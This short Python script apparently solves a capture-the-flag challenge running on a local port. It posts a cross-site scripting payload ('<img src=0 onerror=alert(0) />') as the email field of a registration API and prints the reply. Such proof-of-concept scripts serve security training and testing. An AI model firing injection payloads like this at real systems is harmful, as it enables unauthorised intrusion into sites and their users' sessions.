#!/usr/bin/env python3

import requests

HOST, PORT = "0.0.0.0", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"

def main():
    xss = "<img src=0 onerror=alert(0) />"

    json_data = {
        "email": xss
    }

    resp = requests.post(f"{CHALLENGE_URL}/api/register", json=json_data)

    print(resp.text)


if __name__ == "__main__":
    main()
